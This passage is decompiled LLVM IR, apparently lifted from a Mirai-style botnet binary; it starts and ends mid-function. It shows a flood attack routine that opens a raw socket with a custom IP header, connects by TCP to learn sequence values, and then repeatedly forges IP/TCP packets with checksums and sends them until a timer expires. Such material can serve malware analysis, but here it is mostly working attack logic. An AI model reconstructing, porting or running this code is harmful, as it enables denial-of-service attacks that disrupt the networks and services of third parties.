  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b550 = load i32, i32* @r4, align 4
  store i32 %v0_b550, i32* %r1.global-to-local, align 4
  %v0_b558 = load i32, i32* @r5, align 4
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  %v4_b55c = inttoptr i32 %v0_b550 to i32*
  %v5_b55c = call i32 @attack_get_opt_int(i32 %v0_b558, i32* %v4_b55c, i32 1, i32 1)
  %v1_b564 = urem i32 %v5_b55c, 256
  store i32 %v1_b564, i32* %r3.global-to-local, align 4
  %v0_b568 = load i32, i32* @r7, align 4
  store i32 %v0_b568, i32* %r0.global-to-local, align 4
  %v1_b570 = inttoptr i32 %v0_b568 to i32*
  %v2_b570 = call i32 @__GI_time(i32* %v1_b570)
  %v1_b574 = load i32, i32* @r6, align 4
  %v2_b574 = add i32 %v1_b574, %v2_b570
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b588 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b588, i32* %r0.global-to-local, align 4
  %v7_b58c = icmp eq i32 %v3_b588, -1
  store i32 %v3_b588, i32* @sl, align 4
  br i1 %v7_b58c, label %dec_label_pc_b8cc, label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b5a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b5a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5a8 = load i32, i32* @r7, align 4
  store i32 %v0_b5a8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b5b4 = call i32 @__GI_setsockopt(i32 %v3_b588, i32 %v0_b5a8, i32 3, i32 %v6_b5a0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b5b4, i32* %r0.global-to-local, align 4
  %v7_b5b8 = icmp eq i32 %v5_b5b4, -1
  br i1 %v7_b5b8, label %dec_label_pc_b8c4, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b598
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_b5c4 = load i32, i32* @r8, align 4
  %v3_b5c8 = urem i32 %v0_b5c4, 65536
  store i32 %v3_b5c8, i32* @r3, align 4
  %v2_b5cc = icmp eq i32 %arg2, 0
  %v0_b5d0 = load i32, i32* @r7, align 4
  store i32 %v0_b5d0, i32* %stack_var_-44, align 4
  %v5_b5d4 = trunc i32 %v0_b5c4 to i16
  br i1 %v2_b5cc, label %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge, label %dec_label_pc_b5dc.preheader

dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge: ; preds = %dec_label_pc_b5c0
  %.pre = sext i16 %v5_b5d4 to i32
  %.pre91 = add i32 %v6_b544, 40
  br label %dec_label_pc_b768.preheader

dec_label_pc_b5dc.preheader:                      ; preds = %dec_label_pc_b5c0
  %v2_b620 = ptrtoint i32* %stack_var_-160 to i32
  %v2_b668 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b680 = ptrtoint i32* %stack_var_-80 to i32
  %v2_b688 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b68c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b714 = zext i8 %tmp30 to i32
  %v1_b718 = and i32 %v4_b714, 18
  %v2_b71c = icmp eq i32 %v1_b718, 18
  %v1_b9cc = add i32 %v6_b544, 40
  %v4_ba0c = sext i16 %v5_b5d4 to i32
  %v3_ba18 = udiv i32 %v4_ba0c, 256
  %v1_baf4 = urem i32 %v5_b484, 2
  %tmp92 = sub nsw i32 0, %v1_baf4
  %v4_bafc = and i32 %tmp92, 32
  %v1_bb28 = urem i32 %v6_b4c4, 2
  %tmp93 = sub nsw i32 0, %v1_bb28
  %v4_bb30 = and i32 %tmp93, 8
  %v1_bb74 = urem i32 %v6_b524, 2
  %v3_b700 = sext i16 %tmp60 to i32
  %v1_b724 = and i32 %v4_b714, 5
  %v2_b724 = icmp eq i32 %v1_b724, 0
  %v4_b660 = add i32 %v2_b620, 98
  %v5_b660 = inttoptr i32 %v4_b660 to i16*
  %v1_ba14 = mul nsw i32 %v4_ba0c, 256
  %v4_ba24 = and i32 %v1_ba14, 65280
  %v5_ba24 = or i32 %v4_ba24, %v3_ba18
  %v1_bb0c = urem i32 %v6_b4a4, 2
  %tmp94 = sub nsw i32 0, %v1_bb0c
  %v4_bb14 = and i32 %tmp94, 16
  %v1_bb40 = urem i32 %v6_b4e4, 2
  %tmp95 = sub nsw i32 0, %v1_bb40
  %v4_bb48 = and i32 %tmp95, 4
  %v1_bb58 = urem i32 %v6_b504, 2
  %tmp96 = sub nsw i32 0, %v1_bb58
  %v3_bb60 = and i32 %tmp96, 2
  br label %dec_label_pc_b5dc.outer

dec_label_pc_b5dc.outer:                          ; preds = %dec_label_pc_b5dc.preheader, %.thread10
  %stack_var_-340.0.ph = phi i32 [ %tmp, %dec_label_pc_b5dc.preheader ], [ %v0_ba58, %.thread10 ]
  %stack_var_-62.0.ph = phi i16 [ %tmp31, %dec_label_pc_b5dc.preheader ], [ %stack_var_-62.2, %.thread10 ]
  %stack_var_-60.0.ph = phi i32 [ %tmp34, %dec_label_pc_b5dc.preheader ], [ %v0_b970, %.thread10 ]
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5dc.outer, %dec_label_pc_b750
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b750 ], [ %stack_var_-62.0.ph, %dec_label_pc_b5dc.outer ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b750 ], [ %stack_var_-60.0.ph, %dec_label_pc_b5dc.outer ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b5e8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b5e8, i32* %r0.global-to-local, align 4
  %v7_b5ec = icmp eq i32 %v3_b5e8, -1
  store i32 %v3_b5e8, i32* @r8, align 4
  br i1 %v7_b5ec, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5dc, %dec_label_pc_b72c
  %v0_b600 = phi i32 [ %v3_b740, %dec_label_pc_b72c ], [ %v3_b5e8, %dec_label_pc_b5dc ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b72c ], [ %stack_var_-62.0, %dec_label_pc_b5dc ]
  %stack_var_-60.1 = phi i32 [ %v0_b970, %dec_label_pc_b72c ], [ %stack_var_-60.0, %dec_label_pc_b5dc ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b600 = call i32 @__libc_fcntl(i32 %v0_b600, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b608 = or i32 %v2_b600, 2048
  store i32 %v1_b608, i32* @r2, align 4
  %v0_b60c = load i32, i32* @r8, align 4
  store i32 %v0_b60c, i32* %r0.global-to-local, align 4
  %v2_b610 = call i32 @__libc_fcntl(i32 %v0_b60c, i32 4)
  store i32 %v2_b610, i32* %r0.global-to-local, align 4
  %v3_b614 = load i32, i32* %stack_var_-44, align 4
  %v5_b61c = mul i32 %v3_b614, 24
  store i32 %v2_b620, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_b62c = load i32, i32* @fp, align 4
  %v2_b62c = add i32 %v1_b62c, %v5_b61c
  store i32 %v2_b62c, i32* %r3.global-to-local, align 4
  %v1_b630 = add i32 %v2_b62c, 20
  %v2_b630 = inttoptr i32 %v1_b630 to i8*
  %v3_b630 = load i8, i8* %v2_b630, align 1
  %v4_b630 = zext i8 %v3_b630 to i32
  store i32 %v4_b630, i32* %r2.global-to-local, align 4
  %v2_b634 = icmp ugt i8 %v3_b630, 30
  %v7_b634 = icmp eq i8 %v3_b630, 31
  %v2_b638 = xor i1 %v7_b634, true
  %v3_b638 = and i1 %v2_b634, %v2_b638
  br i1 %v3_b638, label %bb, label %bb70

bb:                                               ; preds = %dec_label_pc_b5f8
  %v5_b638 = add i32 %v2_b62c, 16
  %v6_b638 = inttoptr i32 %v5_b638 to i32*
  %v7_b638 = load i32, i32* %v6_b638, align 4
  store i32 %v7_b638, i32* %r3.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_b5f8, %bb
  %v4_b63c = phi i32 [ %v2_b62c, %dec_label_pc_b5f8 ], [ %v7_b638, %bb ]
  %v4_b63c.stack_var_-60.1 = select i1 %v3_b638, i32 %v4_b63c, i32 %stack_var_-60.1
  %v2_b640 = xor i1 %v2_b634, true
  %v3_b640 = or i1 %v7_b634, %v2_b640
  br i1 %v3_b640, label %dec_label_pc_b8d8, label %dec_label_pc_b644

dec_label_pc_b644:                                ; preds = %bb70, %dec_label_pc_b8d8
  %v0_b970 = phi i32 [ %v5_b924, %dec_label_pc_b8d8 ], [ %v4_b63c.stack_var_-60.1, %bb70 ]
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_b64c = load i32, i32* @sb, align 4
  %v9_b64c = icmp eq i32 %v0_b64c, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  br i1 %v9_b64c, label %dec_label_pc_b930, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_b644
  %v4_b650 = udiv i32 %v0_b64c, 256
  %v2_b654 = urem i32 %v0_b64c, 256
  store i32 %v2_b654, i32* %r2.global-to-local, align 4
  %v5_b658 = mul nuw nsw i32 %v2_b654, 256
  %v6_b658 = or i32 %v5_b658, %v4_b650
  store i32 %v6_b658, i32* %r3.global-to-local, align 4
  store i32 %v2_b620, i32* %ip.global-to-local, align 4
  %v2_b660 = trunc i32 %v6_b658 to i16
  store i16 %v2_b660, i16* %v5_b660, align 2
  br label %dec_label_pc_b668

dec_label_pc_b668:                                ; preds = %.thread7, %dec_label_pc_b930
  %stack_var_-62.2 = phi i16 [ %v1_b930, %dec_label_pc_b930 ], [ %stack_var_-62.1, %.thread7 ]
  store i32 %v2_b668, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b670 = load i32, i32* @r8, align 4
  store i32 %v0_b670, i32* %r0.global-to-local, align 4
  %v3_b674 = call i32 @__libc_connect(i32 %v0_b670, i32 %v2_b668, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b67c = call i32 @__GI_time(i32* null)
  store i32 %v2_b67c, i32* %r0.global-to-local, align 4
  store i32 %v2_b680, i32* @r7, align 4
  store i32 %v2_b67c, i32* @r4, align 4
  store i32 %v2_b688, i32* @r6, align 4
  store i32 %v2_b68c, i32* @r5, align 4
  %v9_b6e0 = icmp eq i32 %tmp32, %v0_b970
  %v4_b708 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b6e0 to i32
  %v9_b6f4 = icmp eq i1 %v9_b6e0, false
  %v9_b70c = icmp eq i32 %v3_b700, %v4_b708
  br label %dec_label_pc_b6a4

dec_label_pc_b694:                                ; preds = %.thread, %dec_label_pc_b6fc, %dec_label_pc_b724, %bb73
  %v2_b694 = call i32 @__GI_time(i32* null)
  %v0_b698 = load i32, i32* @r4, align 4
  %v2_b698 = sub i32 %v2_b694, %v0_b698
  store i32 %v2_b698, i32* %r0.global-to-local, align 4
  %v8_b6a0 = icmp sgt i32 %v2_b698, 10
  br i1 %v8_b6a0, label %dec_label_pc_b72c, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b694, %dec_label_pc_b668
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 %v2_b688, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b6b4 = load i32, i32* @sl, align 4
  store i32 %v0_b6b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_b6c4 = call i32 @__libc_recvfrom(i32 %v0_b6b4, i32 %v2_b688, i32 256, i32 16384, i32 %v2_b680, i32 %v2_b68c)
  store i32 %v6_b6c4, i32* %r2.global-to-local, align 4
  %v7_b6cc = icmp eq i32 %v6_b6c4, -1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b6cc, label %dec_label_pc_b8cc, label %dec_label_pc_b6d8

dec_label_pc_b6d8:                                ; preds = %dec_label_pc_b6a4
  store i32 %v0_b970, i32* @r1, align 4
  store i32 %tmp32, i32* @r3, align 4
  store i32 %., i32* @lr, align 4
  %tmp97 = icmp ult i32 %v6_b6c4, 41
  br i1 %tmp97, label %.thread, label %bb73

.thread:                                          ; preds = %dec_label_pc_b6d8
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_b694

bb73:                                             ; preds = %dec_label_pc_b6d8
  br i1 %v9_b6f4, label %dec_label_pc_b694, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %bb73
  store i32 %v3_b700, i32* @lr, align 4
  store i32 %v2_b620, i32* @r3, align 4
  store i32 %v4_b708, i32* %r2.global-to-local, align 4
  br i1 %v9_b70c, label %dec_label_pc_b714, label %dec_label_pc_b694

dec_label_pc_b714:                                ; preds = %dec_label_pc_b6fc
  store i32 %v4_b714, i32* %r2.global-to-local, align 4
  store i32 %v1_b718, i32* @r3, align 4
  br i1 %v2_b71c, label %dec_label_pc_b964, label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b714
  br i1 %v2_b724, label %dec_label_pc_b694, label %dec_label_pc_b72c

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b694
  %v0_b72c = load i32, i32* @r8, align 4
  store i32 %v0_b72c, i32* %r0.global-to-local, align 4
  %v1_b730 = call i32 @__GI___libc_close(i32 %v0_b72c)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b740 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b740, i32* %r0.global-to-local, align 4
  %v3_b744 = icmp eq i32 %v3_b740, -1
  store i32 %v3_b740, i32* @r8, align 4
  br i1 %v3_b744, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b750:                                ; preds = %dec_label_pc_b72c, %dec_label_pc_b5dc
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b5dc ], [ %stack_var_-62.2, %dec_label_pc_b72c ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b5dc ], [ %v0_b970, %dec_label_pc_b72c ]
  %v3_b750 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_b758 = add i32 %v3_b750, 1
  store i32 %v1_b758, i32* @r3, align 4
  store i32 %v1_b758, i32* %stack_var_-44, align 4
  %v5_b764 = icmp slt i32 %v1_b758, %arg2
  br i1 %v5_b764, label %dec_label_pc_b5dc, label %dec_label_pc_b768.preheader

dec_label_pc_b768.preheader:                      ; preds = %.thread10, %dec_label_pc_b750, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge
  %v1_b7a0.pre-phi = phi i32 [ %.pre91, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v1_b9cc, %dec_label_pc_b750 ], [ %v1_b9cc, %.thread10 ]
  %v4_b884.pre-phi = phi i32 [ %.pre, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v4_ba0c, %dec_label_pc_b750 ], [ %v4_ba0c, %.thread10 ]
  %v3_b780 = mul i32 %v6_b544, 65536
  %v1_b784 = add i32 %v3_b780, 1310720
  %tmp75 = udiv i32 %v1_b784, 256
  %v3_b790 = and i32 %tmp75, 65280
  %v2_b89c = icmp eq i32 %v1_b564, 0
  %v4_b794 = udiv i32 %v1_b784, 16777216
  %v5_b794 = or i32 %v3_b790, %v4_b794
  %v1_b79c = add i32 %v6_b544, 20
  %v9_b88c = icmp eq i32 %v4_b884.pre-phi, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  br label %dec_label_pc_b768

dec_label_pc_b768:                                ; preds = %dec_label_pc_b768.preheader, %dec_label_pc_b94c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b5cc, label %dec_label_pc_b94c, label %dec_label_pc_b77c

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b768
  store i32 %v1_b784, i32* %r2.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  store i32 %v3_b790, i32* %r3.global-to-local, align 4
  store i32 %v5_b794, i32* @sb, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_b79c, i32* @r8, align 4
  store i32 %v1_b7a0.pre-phi, i32* @r7, align 4
  br label %dec_label_pc_b878

dec_label_pc_b7a8:                                ; preds = %dec_label_pc_b898, %dec_label_pc_b8a4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b7ac = load i32, i32* @r5, align 4
  %v3_b7ac = add i32 %v2_b7ac, 10
  %v4_b7ac = inttoptr i32 %v3_b7ac to i16*
  store i16 0, i16* %v4_b7ac, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b7b4 = load i32, i32* @r5, align 4
  store i32 %v0_b7b4, i32* @r0, align 4
  %v2_b7b8 = call i32 @checksum_generic(i32 %v0_b7b4, i32 20)
  %v3_b7b8 = trunc i32 %v2_b7b8 to i16
  store i32 %v2_b7b8, i32* %r0.global-to-local, align 4
  %v3_b7bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  %v3_b7c4 = mul i32 %v3_b7bc, 16
  %v2_b7c8 = add i32 %v3_b7c4, %v2_b3c0
  store i32 %v2_b7c8, i32* %r1.global-to-local, align 4
  %v1_b7cc = add i32 %v2_b7c8, 4
  %v2_b7cc = inttoptr i32 %v1_b7cc to i32*
  %v3_b7cc = load i32, i32* %v2_b7cc, align 4
  %v3_b7d0 = mul i32 %v3_b7cc, 65536
  store i32 %v3_b7d0, i32* %ip.global-to-local, align 4
  %tmp76 = mul i32 %v3_b7cc, 256
  %v1_b7d8 = and i32 %tmp76, 65280
  %tmp77 = udiv i32 %v3_b7cc, 256
  %v4_b7dc = urem i32 %tmp77, 256
  %v5_b7dc = or i32 %v4_b7dc, %v1_b7d8
  store i32 %v5_b7dc, i32* %r3.global-to-local, align 4
  %v1_b7e0 = add i32 %v3_b7cc, 1
  store i32 %v1_b7e0, i32* %r2.global-to-local, align 4
  store i32 %v1_b7e0, i32* %v2_b7cc, align 4
  %v0_b7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7e8 = load i32, i32* @r6, align 4
  %v2_b7e8 = add i32 %v1_b7e8, 4
  %v3_b7e8 = inttoptr i32 %v2_b7e8 to i32*
  store i32 %v0_b7e8, i32* %v3_b7e8, align 4
  %v0_b7ec = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ec = add i32 %v0_b7ec, 8
  %v2_b7ec = inttoptr i32 %v1_b7ec to i32*
  %v3_b7ec = load i32, i32* %v2_b7ec, align 4
  %tmp78 = mul i32 %v3_b7ec, 256
  %v1_b7f8 = and i32 %tmp78, 65280
  %tmp79 = udiv i32 %v3_b7ec, 256
  %v4_b7fc = urem i32 %tmp79, 256
  %v5_b7fc = or i32 %v4_b7fc, %v1_b7f8
  store i32 %v5_b7fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v3_b804 = load i32, i32* @r5, align 4
  %v4_b804 = add i32 %v3_b804, 10
  %v5_b804 = inttoptr i32 %v4_b804 to i16*
  store i16 %v3_b7b8, i16* %v5_b804, align 2
  %v0_b808 = load i32, i32* %r3.global-to-local, align 4
  %v1_b808 = load i32, i32* @r6, align 4
  %v2_b808 = add i32 %v1_b808, 8
  %v3_b808 = inttoptr i32 %v2_b808 to i32*
  store i32 %v0_b808, i32* %v3_b808, align 4
  %v0_b80c = load i32, i32* @lr, align 4
  %v1_b80c = trunc i32 %v0_b80c to i16
  %v2_b80c = load i32, i32* @r6, align 4
  %v3_b80c = add i32 %v2_b80c, 16
  %v4_b80c = inttoptr i32 %v3_b80c to i16*
  store i16 %v1_b80c, i16* %v4_b80c, align 2
  %v0_b810 = load i32, i32* @r6, align 4
  store i32 %v0_b810, i32* @r1, align 4
  %v0_b814 = load i32, i32* @sb, align 4
  store i32 %v0_b814, i32* %r2.global-to-local, align 4
  %v0_b818 = load i32, i32* @r8, align 4
  store i32 %v0_b818, i32* %r3.global-to-local, align 4
  %v0_b81c = load i32, i32* @r5, align 4
  store i32 %v0_b81c, i32* %r0.global-to-local, align 4
  %v4_b820 = call i32 @checksum_tcpudp(i32 %v0_b81c, i32 %v0_b810, i32 %v0_b814, i32 %v0_b818)
  %v5_b820 = trunc i32 %v4_b820 to i16
  store i32 %v4_b820, i32* %r0.global-to-local, align 4
  %v3_b824 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b824, i32* %r3.global-to-local, align 4
  %v3_b828 = mul i32 %v3_b824, 32
  store i32 %v3_b828, i32* %lr.global-to-local, align 4
  %v3_b82c = load i32, i32* @r6, align 4
  %v4_b82c = add i32 %v3_b82c, 16
  %v5_b82c = inttoptr i32 %v4_b82c to i16*
  store i16 %v5_b820, i16* %v5_b82c, align 2
  %v0_b830 = load i32, i32* %lr.global-to-local, align 4
  %v1_b830 = load i32, i32* %r3.global-to-local, align 4
  %tmp98 = mul i32 %v1_b830, -8
  %v5_b830 = add i32 %v0_b830, %tmp98
  store i32 %v5_b830, i32* %lr.global-to-local, align 4
  %v0_b834 = load i32, i32* @r6, align 4
  %v1_b834 = add i32 %v0_b834, 2
  %v2_b834 = inttoptr i32 %v1_b834 to i16*
  %v3_b834 = load i16, i16* %v2_b834, align 2
  %v4_b834 = zext i16 %v3_b834 to i32
  store i32 %v4_b834, i32* @r6, align 4
  %v1_b838 = load i32, i32* @fp, align 4
  %v2_b838 = add i32 %v1_b838, %v5_b830
  store i32 %v2_b838, i32* @lr, align 4
  %v3_b83c = add i32 %v2_b838, 2
  %v4_b83c = inttoptr i32 %v3_b83c to i16*
  store i16 %v3_b834, i16* %v4_b83c, align 2
  %v0_b840 = load i32, i32* @r5, align 4
  store i32 %v0_b840, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  store i32 %v0_b84c, i32* %r0.global-to-local, align 4
  %v0_b850 = load i32, i32* @r7, align 4
  store i32 %v0_b850, i32* %r2.global-to-local, align 4
  %v0_b854 = load i32, i32* @lr, align 4
  %v6_b85c = call i32 @__libc_sendto(i32 %v0_b84c, i32 %v0_b840, i32 %v0_b850, i32 16384, i32 %v0_b854, i32 16)
  %v3_b860 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b860, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_b868 = add i32 %v3_b860, 1
  store i32 %v1_b868, i32* %r0.global-to-local, align 4
  store i32 %v1_b868, i32* %stack_var_-44, align 4
  %v7_b874 = icmp slt i32 %v1_b868, %arg2
  br i1 %v7_b874, label %dec_label_pc_b878, label %dec_label_pc_b94c

dec_label_pc_b878:                                ; preds = %dec_label_pc_b7a8, %dec_label_pc_b77c
  %v1_b880 = phi i32 [ %v1_b868, %dec_label_pc_b7a8 ], [ 0, %dec_label_pc_b77c ]
  store i32 %v2_b3d0, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %r3.global-to-local, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v4_b880, %v2_b3d0
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r5, align 4
  store i32 %v4_b884.pre-phi, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v1_b890 = add i32 %v7_b880, 20
  store i32 %v1_b890, i32* @r6, align 4
  br i1 %v9_b88c, label %dec_label_pc_b940, label %dec_label_pc_b898

dec_label_pc_b898:                                ; preds = %dec_label_pc_b878, %dec_label_pc_b940
  store i32 %v1_b564, i32* %r1.global-to-local, align 4
  br i1 %v2_b89c, label %dec_label_pc_b7a8, label %dec_label_pc_b8a4

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b898
  %v0_b8a4 = load i32, i32* @r5, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 40
  store i32 %v1_b8a4, i32* @r4, align 4
  store i32 %v1_b8a4, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v2_b8b0 = call i32 @rand_alphastr(i32 %v1_b8a4, i32 %v6_b544)
  store i32 %v2_b8b0, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b8bc = load i32, i32* @r4, align 4
  %v4_b8bc = add i32 %v2_b8bc, %v6_b544
  %v5_b8bc = inttoptr i32 %v4_b8bc to i8*
  store i8 0, i8* %v5_b8bc, align 1
  br label %dec_label_pc_b7a8

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b598
  %v0_b8c4 = load i32, i32* @sl, align 4
  store i32 %v0_b8c4, i32* %r0.global-to-local, align 4
  %v1_b8c8 = call i32 @__GI___libc_close(i32 %v0_b8c4)
  store i32 %v1_b8c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b8cc

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b94c, %entry, %dec_label_pc_b8c4
  %v1_b8d4 = phi i32 [ %v3_b588, %entry ], [ %v1_b8c8, %dec_label_pc_b8c4 ], [ %v2_b950, %dec_label_pc_b94c ], [ 0, %dec_label_pc_b6a4 ]
  store i32 %v3_b394, i32* %r4.global-to-local, align 4
  store i32 %v27_b394, i32* %lr.global-to-local, align 4
  ret i32 %v1_b8d4

dec_label_pc_b8d8:                                ; preds = %bb70
  %v1_b8d8 = add i32 %v4_b63c, 16
  %v2_b8d8 = inttoptr i32 %v1_b8d8 to i32*
  %v3_b8d8 = load i32, i32* %v2_b8d8, align 4
  store i32 %v3_b8d8, i32* @r4, align 4
  %v0_b8dc = call i32 @rand_next()
  store i32 %v0_b8dc, i32* %r0.global-to-local, align 4
  %v3_b8e0 = load i32, i32* %stack_var_-44, align 4
  %v5_b8e8 = mul i32 %v3_b8e0, 24
  %v0_b8ec = load i32, i32* @r4, align 4
  %v1_b8ec = and i32 %v0_b8ec, 16711680
  store i32 %v1_b8ec, i32* %ip.global-to-local, align 4
  %v3_b8f0 = udiv i32 %v0_b8ec, 16777216
  %v4_b8f4 = udiv i32 %v1_b8ec, 256
  %v5_b8f4 = or i32 %v4_b8f4, %v3_b8f0
  store i32 %v5_b8f4, i32* %r2.global-to-local, align 4
  %v1_b8f8 = load i32, i32* @fp, align 4
  %v2_b8f8 = add i32 %v1_b8f8, %v5_b8e8
  store i32 %v2_b8f8, i32* %r1.global-to-local, align 4
  %v1_b8fc = and i32 %v0_b8ec, 65280
  store i32 %v1_b8fc, i32* %r3.global-to-local, align 4
  %v1_b900 = add i32 %v2_b8f8, 20
  %v2_b900 = inttoptr i32 %v1_b900 to i8*
  %v3_b900 = load i8, i8* %v2_b900, align 1
  %v4_b900 = zext i8 %v3_b900 to i32
  store i32 %v4_b900, i32* %ip.global-to-local, align 4
  %v5_b908 = call i32 @llvm.bswap.i32(i32 %v0_b8ec)
  %v7_b90c = lshr i32 %v0_b8dc, %v4_b900
  %v8_b90c = add i32 %v7_b90c, %v5_b908
  store i32 %v8_b90c, i32* %r2.global-to-local, align 4
  %v1_b910 = and i32 %v8_b90c, 16711680
  store i32 %v1_b910, i32* %r0.global-to-local, align 4
  %v1_b91c = and i32 %v8_b90c, 65280
  store i32 %v1_b91c, i32* %r1.global-to-local, align 4
  %v5_b924 = call i32 @llvm.bswap.i32(i32 %v8_b90c)
  store i32 %v5_b924, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b644

dec_label_pc_b930:                                ; preds = %dec_label_pc_b644
  %v0_b930 = call i32 @rand_next()
  %v1_b930 = trunc i32 %v0_b930 to i16
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  store i32 %v2_b620, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b668

dec_label_pc_b940:                                ; preds = %dec_label_pc_b878
  %v0_b940 = call i32 @rand_next()
  %v1_b940 = trunc i32 %v0_b940 to i16
  store i32 %v0_b940, i32* %r0.global-to-local, align 4
  %v3_b944 = load i32, i32* @r5, align 4
  %v4_b944 = add i32 %v3_b944, 4
  %v5_b944 = inttoptr i32 %v4_b944 to i16*
  store i16 %v1_b940, i16* %v5_b944, align 2
  br label %dec_label_pc_b898

dec_label_pc_b94c:                                ; preds = %dec_label_pc_b7a8, %dec_label_pc_b768
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b950 = call i32 @__GI_time(i32* null)
  store i32 %v2_b950, i32* %r0.global-to-local, align 4
  store i32 %v2_b574, i32* %r2.global-to-local, align 4
